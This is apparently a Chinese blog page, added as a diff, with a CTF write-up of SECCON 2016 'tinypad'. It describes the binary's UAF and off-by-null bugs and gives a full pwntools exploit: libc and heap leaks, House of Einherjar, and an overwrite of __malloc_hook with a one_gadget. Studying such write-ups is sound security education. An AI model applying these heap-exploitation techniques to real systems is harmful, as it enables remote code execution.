@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        Ovie博客
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            SECCON 2016 tinypad题目
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <p>文件：<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/house-of-einherjar/2016_seccon_tinypad" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/house-of-einherjar/2016_seccon_tinypad</a></p>
+<p>checksec下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="程序操作"><a href="#程序操作" class="headerlink" title="程序操作"></a>程序操作</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">添加memo：    申请的大小范围：1 - 0x100</span><br><span class="line">删除memo：    存在UAF</span><br><span class="line">编辑memo：</span><br><span class="line"></span><br><span class="line">使用read_until函数读取memo内容，该函数有off-by-null</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="程序数据存储："><a href="#程序数据存储：" class="headerlink" title="程序数据存储："></a>程序数据存储：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tinypad+256起存储memos</span><br><span class="line">每个memo是0x10字节：</span><br><span class="line">	8字节：memo长度</span><br><span class="line">    8字节：指向memo内容</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="pwn脚本"><a href="#pwn脚本" class="headerlink" title="pwn脚本"></a>pwn脚本</h4><p>思路：通过off-by-null，利用House of Einherjar构造overlapping chunk，再覆盖fast chunk的fd指针，指向<code>__malloc_hook</code>附近，将<code>__malloc_hook</code>覆盖成<code>one_gadget</code>。</p>
+<p>tinypad_pwn.py：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pdb</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_memo</span><span class="params">(p, size, content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"(CMD)&gt;&gt;&gt;"</span>)</span><br><span class="line">    p.sendline(<span class="string">"A"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"(SIZE)&gt;&gt;&gt;"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"(CONTENT)&gt;&gt;&gt;"</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_memo</span><span class="params">(p, idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"(CMD)&gt;&gt;&gt;"</span>)</span><br><span class="line">    p.sendline(<span class="string">"D"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"(INDEX)&gt;&gt;&gt;"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_memo</span><span class="params">(p, idx, content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"(CMD)&gt;&gt;&gt;"</span>)</span><br><span class="line">    p.sendline(<span class="string">"E"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"(INDEX)&gt;&gt;&gt;"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"(CONTENT)&gt;&gt;&gt;"</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    p.recvuntil(<span class="string">"(Y/n)&gt;&gt;&gt;"</span>)</span><br><span class="line">    p.sendline(<span class="string">"Y"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./tinypad"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一步： 利用UAF泄露heap地址和libc基址</span></span><br><span class="line">add_memo(p, <span class="number">0x60</span>, <span class="string">"A"</span> * <span class="number">0x10</span>) <span class="comment"># fast chunk</span></span><br><span class="line">add_memo(p, <span class="number">0x60</span>, <span class="string">"B"</span> * <span class="number">0x10</span>) <span class="comment"># fast chunk</span></span><br><span class="line">add_memo(p, <span class="number">0xf0</span>, <span class="string">"C"</span> * <span class="number">0x10</span>) <span class="comment"># unsorted chunk</span></span><br><span class="line">add_memo(p, <span class="number">0x80</span>, <span class="string">"D"</span> * <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">delete_memo(p, <span class="number">3</span>)</span><br><span class="line">delete_memo(p, <span class="number">2</span>)</span><br><span class="line">delete_memo(p, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"INDEX: 1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"CONTENT: "</span>)</span><br><span class="line">addr_heap = u64(p.recvuntil(<span class="string">"\n"</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">log.success(<span class="string">"addr_heap: "</span> + hex(addr_heap))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"INDEX: 3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"CONTENT: "</span>)</span><br><span class="line">addr_unsorted_bin = u64(p.recvuntil(<span class="string">"\n"</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">log.success(<span class="string">"addr_unsorted_bin: "</span> + hex(addr_unsorted_bin))</span><br><span class="line">addr_libc = addr_unsorted_bin - <span class="number">0x3c4b78</span>  <span class="comment"># Fix You</span></span><br><span class="line">log.success(<span class="string">"addr_libc: "</span> + hex(addr_libc))</span><br><span class="line">addr_malloc_hook = addr_libc + <span class="number">0x3C4B10</span>  <span class="comment"># Fix You</span></span><br><span class="line">addr_fake_fastchunk = addr_malloc_hook - <span class="number">0x23</span></span><br><span class="line">one_gadget = addr_libc + <span class="number">0xf1147</span>  <span class="comment"># 该one_gadget需满足[rsp+0x70] == NULL   # Fix You</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二步： 利用House Of Einherjar构造overlapping chunk</span></span><br><span class="line">add_memo(p, <span class="number">0xf0</span>, <span class="string">"C"</span> * <span class="number">0x10</span>)  <span class="comment"># use unsorted chunk (index: 1)</span></span><br><span class="line">add_memo(p, <span class="number">0x60</span>, p64(<span class="number">0</span>) + p64(<span class="number">0xd0</span>) + p64(addr_heap - <span class="number">0x60</span>) + p64(addr_heap - <span class="number">0x60</span>))  <span class="comment"># fake chunk (index: 2)</span></span><br><span class="line">add_memo(p, <span class="number">0x68</span>, <span class="string">"B"</span> * <span class="number">0x60</span> + p64(<span class="number">0xd0</span>))  <span class="comment"># off-by-one (index: 3, will be overlapping chunk)</span></span><br><span class="line"><span class="string">'''此时堆从低地址到高地址的分布：  </span></span><br><span class="line"><span class="string">fake chunk                  --   AAAA  ----  (index: 2)</span></span><br><span class="line"><span class="string">用于执行off-by-one的chunk     --   BBBB  ----  (index: 3)</span></span><br><span class="line"><span class="string">用于free的chunk              --   CCCC  ----  (index: 1)</span></span><br><span class="line"><span class="string">靠top chunk的chunk           --   DDDD  ----  (index: 4)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">delete_memo(p, <span class="number">1</span>)  <span class="comment"># free to consolidate backward</span></span><br><span class="line">delete_memo(p, <span class="number">3</span>)  <span class="comment"># add this overlapping chunk to fastbin</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第三步： 覆盖fastbin上的chunk的fd指针，指向__malloc_hook附近区域</span></span><br><span class="line">add_memo(p, <span class="number">0x90</span>, <span class="string">"E"</span> * <span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(addr_fake_fastchunk)) <span class="comment"># (index: 1)</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">因为最多只能有4个memo，这里需要删除一个，后面才能申请到两个memo</span></span><br><span class="line"><span class="string">这里不能调delete_memo(p, 4)， 因为要释放调这个靠top chunk的chunk，其会跟top chunk合并，下面的size变量会加上top chunk的大小，从而满足下面的条件</span></span><br><span class="line"><span class="string">if ((unsigned long)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span></span><br><span class="line"><span class="string">  if (have_fastchunks(av))</span></span><br><span class="line"><span class="string">malloc_consolidate(av);</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">就会调用到malloc_consolidate函数。而在这个函数里处理fastbin chunk时会调用到unlink，而unlink时会检查被unlink的chunk的size和prev_size，这个检查通不过。</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">delete_memo(p, <span class="number">1</span>) </span><br><span class="line"></span><br><span class="line">add_memo(p, <span class="number">0x60</span>, <span class="string">"F"</span> * <span class="number">0x10</span>) <span class="comment"># (index: 1)</span></span><br><span class="line">add_memo(p, <span class="number">0x60</span>, <span class="string">"X"</span> * (addr_malloc_hook - addr_fake_fastchunk - <span class="number">0x10</span>) + p64(one_gadget)) <span class="comment"># (index: 2)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第四步： 调用malloc， 触发one_gadget</span></span><br><span class="line">delete_memo(p, <span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">"(CMD)&gt;&gt;&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"A"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"(SIZE)&gt;&gt;&gt;"</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>运行上面的脚本前需根据自己的libc版本来修改几个硬编码值，脚本里用<code>Fix You</code>标注出。<br>附：<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_einherjar/#2016-seccon-tinypad" target="_blank" rel="noopener">这里</a>有个思路是跟上面稍微有些不同</p>
+
+    </div>
+    
+</div>
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" href="https://hexo.io" target="_blank" rel="noopener">Hexo</a>-<a class="flink" href="https://github.com/sanjinhub/hexo-theme-geek" target="_blank" rel="noopener">Geek</a>.
+        <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
+            <input type="checkbox" name="switch" id="update_style">
+            <span class="el-switch-style"></span>
+        </label>
+<!--         <script type="text/javascript">
+        var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+        document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+        </script> -->
+    </p>
+</div>
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="FqiyUqbg7McKN2eG0MCewupf">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
